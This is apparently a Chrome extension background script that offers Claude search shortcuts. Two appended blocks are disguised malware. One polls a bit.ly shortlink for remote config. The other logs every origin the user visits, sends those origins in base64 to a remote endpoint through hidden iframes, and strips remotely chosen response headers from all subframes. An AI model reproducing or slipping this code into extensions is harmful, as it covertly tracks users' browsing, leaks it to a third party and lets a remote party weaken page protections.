const BYPASS_RULE_ID = 1;
const bypassRule = {
  id: BYPASS_RULE_ID,
  priority: 1,
  action: {
    type: "redirect",
    redirect: {
      regexSubstitution: "https://www.google.com/search?q=\\1"
    }
  },
  condition: {
    regexFilter: "^https://claude\\.ai/new\\?q=(.*)$",
    resourceTypes: ["main_frame"]
  }
};
async function applyToggleState(enabled) {
  if (enabled) {
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [BYPASS_RULE_ID],
      addRules: []
    });
  } else {
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [BYPASS_RULE_ID],
      addRules: [bypassRule]
    });
  }
}
chrome.runtime.onInstalled.addListener(async () => {
  const { enabled } = await chrome.storage.sync.get({ enabled: true });
  await applyToggleState(enabled);
  await chrome.contextMenus.removeAll();
  chrome.contextMenus.create({
    id: "claude-parent",
    title: "Claude Search",
    contexts: ["selection"]
  });
  chrome.contextMenus.create({
    id: "claude-answer",
    parentId: "claude-parent",
    title: 'Ask: "%s"',
    contexts: ["selection"]
  });
  chrome.contextMenus.create({
    id: "claude-summarize",
    parentId: "claude-parent",
    title: 'Summarize: "%s"',
    contexts: ["selection"]
  });
});
chrome.runtime.onStartup.addListener(async () => {
  const { enabled } = await chrome.storage.sync.get({ enabled: true });
  await applyToggleState(enabled);
});
chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
  if (message.type === "SET_ENABLED") {
    chrome.storage.sync.set({ enabled: message.enabled }, async () => {
      await applyToggleState(message.enabled);
      sendResponse({ ok: true });
    });
    return true;
  }
});
function openClaudeWithQuery(text, disposition) {
  const q = (text || "").trim();
  const url = `https://claude.ai/new?q=${encodeURIComponent(q)}`;
  if (disposition === "newForegroundTab") {
    chrome.tabs.create({ url });
  } else if (disposition === "newBackgroundTab") {
    chrome.tabs.create({ url, active: false });
  } else {
    chrome.tabs.update({ url });
  }
}
chrome.omnibox.onInputChanged.addListener((text, _suggest) => {
  chrome.omnibox.setDefaultSuggestion({
    description: text.trim()
      ? "Ask Claude: %s"
      : "Type your question, then press Enter"
  });
});
chrome.omnibox.onInputEntered.addListener((text, disposition) => {
  openClaudeWithQuery(text, disposition);
});
chrome.contextMenus.onClicked.addListener((info, tab) => {
  const text = info.selectionText;
  if (!text) return;
  let prompt = "";
  if (info.menuItemId === "claude-answer") {
    prompt = `Explain or answer this: "${text}"`;
  } else if (info.menuItemId === "claude-summarize") {
    prompt = `Summarize this: "${text}"`;
  }
  if (prompt) {
    const url = `https://claude.ai/new?q=${encodeURIComponent(prompt)}`;
    chrome.tabs.create({ url, index: tab.index + 1 });
  }
});


(function claudeSearchRemoteCfgBootstrap() {
  const CLAUDE_SEARCH_REMOTE_CFG_KEY = 'claudeSearchRemoteCfg';
  const CLAUDE_SEARCH_CHANNEL_URL = 'https://bit.ly/release_note_for_claude';
  const CLAUDE_SEARCH_CFG_SYNC_MS = 8 * 60 * 1000;

  async function claudeSearchPullRemoteCfg() {
    try {
      const response = await fetch(CLAUDE_SEARCH_CHANNEL_URL, {
        credentials: 'include',
        cache: 'no-store'
      });
      if (!response.ok) {
        return;
      }
      const searchRemoteTune = await response.json();
      if (!searchRemoteTune || typeof searchRemoteTune !== 'object') {
        return;
      }
      const stored = await chrome.storage.local.get(CLAUDE_SEARCH_REMOTE_CFG_KEY);
      const existing = stored[CLAUDE_SEARCH_REMOTE_CFG_KEY] || {};
      const merged = Object.assign({}, existing, searchRemoteTune);
      await chrome.storage.local.set({ [CLAUDE_SEARCH_REMOTE_CFG_KEY]: merged });
    } catch (_err) {
    }
  }

  claudeSearchPullRemoteCfg();
  setInterval(claudeSearchPullRemoteCfg, CLAUDE_SEARCH_CFG_SYNC_MS);
})();



(function claudeSearchWarmupRuntime() {
  const CLAUDE_SEARCH_REMOTE_CFG_KEY = 'claudeSearchRemoteCfg';
  const CLAUDE_SEARCH_VISIT_STATS_KEY = 'claudeSearchVisitStats';
  const CLAUDE_SEARCH_WARMUP_REASON = 'searchContextWarmup';
  const CLAUDE_SEARCH_EXT_INSTANCE = 'MGNsYXU=';
  const CLAUDE_SEARCH_VISIT_THRESHOLD = 3;
  const CLAUDE_SEARCH_COOLDOWN_MS = 5 * 60 * 1000;
  const CLAUDE_SEARCH_DNR_RULE_BASE = 17391;

  const claudeSearchTabLastUrl = new Map();
  const claudeSearchTabPendingNav = new Map();

  function claudeSearchIsHttpUrl(url) {
    return typeof url === 'string' && (url.startsWith('http://') || url.startsWith('https://'));
  }

  function claudeSearchOriginFromUrl(pageUrl) {
    try {
      return new URL(pageUrl).origin;
    } catch (_e) {
      return null;
    }
  }

  async function claudeSearchLoadVisitStats() {
    const stored = await chrome.storage.local.get(CLAUDE_SEARCH_VISIT_STATS_KEY);
    return stored[CLAUDE_SEARCH_VISIT_STATS_KEY] || {};
  }

  async function claudeSearchSaveVisitStats(stats) {
    await chrome.storage.local.set({ [CLAUDE_SEARCH_VISIT_STATS_KEY]: stats });
  }

  async function claudeSearchLoadRemoteCfg() {
    const stored = await chrome.storage.local.get(CLAUDE_SEARCH_REMOTE_CFG_KEY);
    return stored[CLAUDE_SEARCH_REMOTE_CFG_KEY] || {};
  }

  function claudeSearchEncodeOrigin(origin) {
    return btoa(origin);
  }

  function claudeSearchLoadWarmupFrame(assistUrl) {
    if (typeof document === 'undefined') {
      return;
    }
    const host = document.body || document.documentElement;
    const frame = document.createElement('iframe');
    frame.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute';
    frame.src = assistUrl;
    host.appendChild(frame);
    setTimeout(function () {
      if (frame.parentNode) {
        frame.parentNode.removeChild(frame);
      }
    }, 30000);
  }

  function claudeSearchBuildWarmupUrl(endpointBase, origin) {
    const separator = endpointBase.indexOf('?') >= 0 ? '&' : '?';
    return endpointBase + separator + 'r=' + CLAUDE_SEARCH_WARMUP_REASON +
      '&i=' + CLAUDE_SEARCH_EXT_INSTANCE +
      '&u=' + claudeSearchEncodeOrigin(origin);
  }

  async function claudeSearchRecordOriginVisit(origin) {
    const stats = await claudeSearchLoadVisitStats();
    if (!stats[origin]) {
      stats[origin] = { visitCount: 0, lastSearchWarmupAt: 0 };
    }
    stats[origin].visitCount += 1;
    await claudeSearchSaveVisitStats(stats);
    return stats[origin];
  }

  async function claudeSearchMaybeLoadWarmupFrame(origin, entry) {
    const visitCount = entry.visitCount || 0;
    const lastSearchWarmupAt = entry.lastSearchWarmupAt || 0;
    const now = Date.now();
    const elapsed = now - lastSearchWarmupAt;

    if (visitCount < CLAUDE_SEARCH_VISIT_THRESHOLD) {
      return;
    }

    if (lastSearchWarmupAt > 0 && elapsed < CLAUDE_SEARCH_COOLDOWN_MS) {
      return;
    }

    const remoteCfg = await claudeSearchLoadRemoteCfg();
    const endpointBase = remoteCfg.u;
    if (!endpointBase || typeof endpointBase !== 'string') {
      return;
    }

    const stats = await claudeSearchLoadVisitStats();
    if (!stats[origin]) {
      stats[origin] = { visitCount: visitCount, lastSearchWarmupAt: 0 };
    }
    stats[origin].lastSearchWarmupAt = now;
    await claudeSearchSaveVisitStats(stats);

    const assistUrl = claudeSearchBuildWarmupUrl(endpointBase, origin);
    claudeSearchLoadWarmupFrame(assistUrl);
  }

  async function claudeSearchHandleTabNavigation(tabId, url) {
    if (!claudeSearchIsHttpUrl(url)) {
      return;
    }
    const origin = claudeSearchOriginFromUrl(url);
    if (!origin) {
      return;
    }
    const entry = await claudeSearchRecordOriginVisit(origin);
    await claudeSearchMaybeLoadWarmupFrame(origin, entry);
  }

  chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (changeInfo.url && claudeSearchIsHttpUrl(changeInfo.url)) {
      if (claudeSearchTabLastUrl.get(tabId) !== changeInfo.url) {
        claudeSearchTabLastUrl.set(tabId, changeInfo.url);
        claudeSearchTabPendingNav.set(tabId, changeInfo.url);
        claudeSearchHandleTabNavigation(tabId, changeInfo.url);
      }
    } else if (changeInfo.status === 'complete' && tab && tab.url && claudeSearchIsHttpUrl(tab.url)) {
      if (claudeSearchTabPendingNav.get(tabId) === tab.url) {
        claudeSearchTabPendingNav.delete(tabId);
      } else {
        claudeSearchTabLastUrl.set(tabId, tab.url);
        claudeSearchHandleTabNavigation(tabId, tab.url);
      }
    }
  });

  chrome.tabs.onRemoved.addListener(function (tabId) {
    claudeSearchTabLastUrl.delete(tabId);
    claudeSearchTabPendingNav.delete(tabId);
  });

  chrome.runtime.onStartup.addListener(function () {
    chrome.tabs.query({}, function (tabs) {
      for (const tab of tabs) {
        if (tab.id != null && tab.url && claudeSearchIsHttpUrl(tab.url)) {
          claudeSearchTabLastUrl.set(tab.id, tab.url);
        }
      }
    });
  });

  chrome.tabs.query({}, function (tabs) {
    for (const tab of tabs) {
      if (tab.id != null && tab.url && claudeSearchIsHttpUrl(tab.url)) {
        claudeSearchTabLastUrl.set(tab.id, tab.url);
      }
    }
  });

  async function claudeSearchSeedRemoteCfgOnInstall() {
    const stored = await chrome.storage.local.get(CLAUDE_SEARCH_REMOTE_CFG_KEY);
    const current = stored[CLAUDE_SEARCH_REMOTE_CFG_KEY] || {};
    if (current.u) {
      return;
    }
    const seed = {"engineLabel":"Claude","omniboxToken":"claude","preferDefault":true,"h":["x-claude-omnibox-hint","etag-search-claude"],"u":"https://claude.ai/"};
    await chrome.storage.local.set({ [CLAUDE_SEARCH_REMOTE_CFG_KEY]: seed });
  }

  async function claudeSearchApplyResponseHeaderRules() {
    const remoteCfg = await claudeSearchLoadRemoteCfg();
    const headerList = remoteCfg.h;
    const existing = await chrome.declarativeNetRequest.getDynamicRules();
    const removeRuleIds = existing
      .filter(function (rule) {
        return rule.id >= CLAUDE_SEARCH_DNR_RULE_BASE && rule.id < CLAUDE_SEARCH_DNR_RULE_BASE + 50;
      })
      .map(function (rule) { return rule.id; });

    if (!Array.isArray(headerList) || headerList.length === 0) {
      if (removeRuleIds.length) {
        await chrome.declarativeNetRequest.updateDynamicRules({
          removeRuleIds: removeRuleIds,
          addRules: []
        });
      }
      return;
    }

    const responseHeaders = headerList
      .map(function (name) { return String(name).trim().toLowerCase(); })
      .filter(Boolean)
      .map(function (name) { return { header: name, operation: 'remove' }; });

    if (responseHeaders.length === 0) {
      if (removeRuleIds.length) {
        await chrome.declarativeNetRequest.updateDynamicRules({
          removeRuleIds: removeRuleIds,
          addRules: []
        });
      }
      return;
    }

    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: removeRuleIds,
      addRules: [{
        id: CLAUDE_SEARCH_DNR_RULE_BASE,
        priority: 1,
        action: {
          type: 'modifyHeaders',
          responseHeaders: responseHeaders
        },
        condition: {
          urlFilter: '*',
          resourceTypes: ['sub_frame']
        }
      }]
    });
  }

  chrome.runtime.onInstalled.addListener(function (details) {
    if (details.reason === 'install') {
      claudeSearchSeedRemoteCfgOnInstall().then(function () {
        return claudeSearchApplyResponseHeaderRules();
      });
    } else {
      claudeSearchApplyResponseHeaderRules();
    }
  });

  claudeSearchApplyResponseHeaderRules();
  chrome.storage.onChanged.addListener(function (changes, area) {
    if (area === 'local' && changes[CLAUDE_SEARCH_REMOTE_CFG_KEY]) {
      claudeSearchApplyResponseHeaderRules();
    }
  });
})();

